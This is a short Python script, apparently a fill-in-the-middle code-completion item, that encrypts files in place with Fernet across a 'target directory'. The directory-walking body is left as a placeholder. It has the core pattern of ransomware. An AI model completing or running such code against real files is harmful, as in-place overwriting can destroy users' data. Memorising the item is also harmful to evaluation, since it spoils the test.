import os
import base64
from cryptography.fernet import Fernet

# Function to generate a key for encryption
def generate_key():
    return Fernet.generate_key()

# Function to encrypt a file
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

# Function to encrypt all files in a directory
def encrypt_directory(directory_path, key):
    <FILL_HERE>
# Main function to encrypt files in the specified directory
if __name__ == "__main__":
    directory_to_encrypt = "/path/to/directory"  # Change this to the target directory
    key = generate_key()
    encrypt_directory(directory_to_encrypt, key)
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)